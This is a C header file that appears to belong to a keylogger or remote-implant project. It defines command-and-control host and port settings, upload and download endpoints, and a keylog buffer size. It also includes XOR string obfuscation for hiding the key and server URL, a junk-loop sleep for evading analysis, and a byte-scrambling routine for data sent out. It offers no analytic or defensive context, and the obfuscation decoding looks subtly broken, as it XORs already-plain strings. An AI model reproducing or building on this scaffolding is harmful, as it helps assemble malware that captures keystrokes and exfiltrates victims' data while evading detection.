#ifndef COMMON_H
#define COMMON_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <winhttp.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "winhttp.lib")
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <pthread.h>
    #include <sys/types.h>
    #include <fcntl.h>
#endif

#define BUFFER_SIZE 4096
#define MAX_KEYLOG_SIZE 8192

#ifndef C2_HOST
    #define C2_HOST "example.com"
#endif

#ifndef C2_PORT
    #define C2_PORT 443
#endif

#ifndef UPLOAD_ENDPOINT
    #define UPLOAD_ENDPOINT "/api/upload"
#endif

#ifndef DOWNLOAD_ENDPOINT
    #define DOWNLOAD_ENDPOINT "/api/download"
#endif

#define GET_C2_HOST() C2_HOST
#define GET_C2_PORT() C2_PORT
#define GET_UPLOAD_ENDPOINT() UPLOAD_ENDPOINT
#define GET_DOWNLOAD_ENDPOINT() DOWNLOAD_ENDPOINT

typedef struct {
    char c2_url[256];
    char upload_endpoint[128];
    char download_endpoint[128];
    int port;
    int use_ssl;
} Config;

static const char* ENCODED_KEY = "\x54\x68\x69\x73\x49\x73\x41\x4b\x65\x79";
static const char* ENCODED_URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d";
static const char* ENCODED_ENDPOINT = "\x2f\x61\x70\x69\x2f\x75\x70\x6c\x6f\x61\x64";
static const char* ENCODED_DL_ENDPOINT = "\x2f\x61\x70\x69\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64";

static char decoded_key[64];
static char decoded_url[256];
static char decoded_endpoint[128];
static char decoded_dl_endpoint[128];

static void init_obfuscated_strings(void) {
    int key_len = strlen(ENCODED_KEY);
    int url_len = strlen(ENCODED_URL);
    int ep_len = strlen(ENCODED_ENDPOINT);
    int dl_ep_len = strlen(ENCODED_DL_ENDPOINT);
    
    for(int i = 0; i < key_len; i++) {
        decoded_key[i] = ENCODED_KEY[i] ^ ((i * 0x2A + 0x15) & 0xFF);
    }
    decoded_key[key_len] = '\0';
    
    for(int i = 0; i < url_len; i++) {
        decoded_url[i] = ENCODED_URL[i] ^ ((i * 0x1B + 0x3C) & 0xFF);
    }
    decoded_url[url_len] = '\0';
    
    for(int i = 0; i < ep_len; i++) {
        decoded_endpoint[i] = ENCODED_ENDPOINT[i] ^ ((i * 0x2D + 0x1F) & 0xFF);
    }
    decoded_endpoint[ep_len] = '\0';
    
    for(int i = 0; i < dl_ep_len; i++) {
        decoded_dl_endpoint[i] = ENCODED_DL_ENDPOINT[i] ^ ((i * 0x3A + 0x0E) & 0xFF);
    }
    decoded_dl_endpoint[dl_ep_len] = '\0';
}

static void xor_encrypt(char *data, int len, char *key, int key_len) {
    for(int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

static void sleep_junk(int base_ms) {
    volatile int x = 0;
    for(int i = 0; i < 1000 + (x % 500); i++) {
        x += i;
    }
    #ifdef _WIN32
    Sleep(base_ms + (x % 100));
    #else
    usleep((base_ms + (x % 100)) * 1000);
    #endif
}

static int xor_data(char *dest, const char *src, int len) {
    static const char k1 = 0xA5;
    static const char k2 = 0x3C;
    static const char k3 = 0x7B;
    
    for(int i = 0; i < len; i++) {
        char c = src[i];
        c ^= k1;
        c = (c << 3) | (c >> 5);
        c ^= k2;
        c = (c << 2) | (c >> 6);
        c ^= k3;
        dest[i] = c;
    }
    return len;
}

#endif
